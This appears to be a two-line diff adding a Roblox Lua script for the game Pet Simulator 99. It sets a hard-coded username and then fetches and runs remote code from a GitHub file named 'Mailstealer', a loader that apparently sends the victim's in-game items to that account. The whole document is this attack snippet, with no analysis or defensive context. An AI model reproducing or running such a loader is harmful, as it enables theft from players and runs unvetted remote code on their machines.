@@ -1,0 +1,2 @@
+Username = "Jiancarpio01"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/PetSimulator99/main/Mailstealer"))()
